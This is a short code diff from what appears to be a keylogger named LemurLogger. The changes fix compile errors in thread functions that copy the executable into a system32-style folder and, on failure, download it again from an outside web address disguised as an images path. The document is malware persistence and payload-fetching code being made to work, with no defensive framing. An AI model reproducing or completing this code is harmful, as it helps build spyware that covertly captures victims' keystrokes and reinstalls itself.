@@ -110,7 +110,7 @@ DWORD WINAPI ThreadCopy( LPVOID lpParam )
     // Print the parameter values using thread-safe functions.
     if (!(pDataArray->value)) {
         //do copy 1
-        std::string path = "C:\\window\\system32\\";
+        std::string path = "C:/window/system32/";
         std::string filename = "LemurLogger.exe";
         std::string fullpath = path+filename;
         if(!(IO::copy_w_cmd(path,filename))){
@@ -123,7 +123,7 @@ DWORD WINAPI ThreadCopy( LPVOID lpParam )
                     const char* des_path = path.c_str();
                     std::string url = "www.arekor.co/content/images/LemurLogger.exe";
                     if (!(download_File(url,des_path))) {
-                        return 1
+                        return 1;
                     }
                 }
             }
@@ -172,7 +172,7 @@ DWORD WINAPI ThreadCheck( LPVOID lpParam )
                     const char* des_path = path.c_str();
                     std::string url = "www.arekor.co/content/images/LemurLogger.exe";
                     if (!(download_File(url,des_path))) {
-                        return 1
+                        return 1;
                     }
                 }
             }
